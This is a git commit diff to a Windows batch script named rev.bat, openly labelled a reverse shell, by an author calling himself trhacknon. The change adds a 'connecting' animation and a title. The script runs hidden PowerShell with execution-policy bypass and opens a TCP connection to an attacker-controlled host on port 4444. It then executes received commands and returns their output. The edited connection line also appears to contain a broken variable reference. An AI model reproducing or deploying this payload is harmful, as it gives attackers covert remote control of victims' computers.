374e70291fe4d25db69986f9140ea2a8fd0f266e
trhacknon <82779890+trhacknonimous@users.noreply.github.com>
2025-07-12 05:56:36 +0200

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,14 +1,25 @@
 @echo off
-:: Reverse Shell Windows → Kali VPS (port 4444)
-:: by trhacknonimous
+title trhacknon revshell
 
+:: Config
 set LHOST=xxx.xxx.xxx.xxx
 set LPORT=4444
 
-echo [>] Connexion en cours vers %LHOST%:%LPORT% ...
+:: Animation pendant la connexion
+setlocal enabledelayedexpansion
+set "anim=[=     ] [==    ] [===   ] [====  ] [===== ] [======]"
+for /l %%i in (1,1,12) do (
+    for %%a in (%anim%) do (
+        <nul set /p=trhacknon connecting %%a ...  ^<nul
+        timeout /t 0.3 >nul
+        cls
+    )
+)
+echo trhacknon connected!
 
+:: Reverse shell avec PowerShell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
-$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT%);^
+$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT');^
 $stream = $client.GetStream();^
 [byte[]]$bytes = 0..65535|%{0};^
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){^
@@ -20,3 +31,5 @@ $stream.Write($sendbyte,0,$sendbyte.Length);^
 $stream.Flush();^
 };^
 $client.Close()
+
+pause
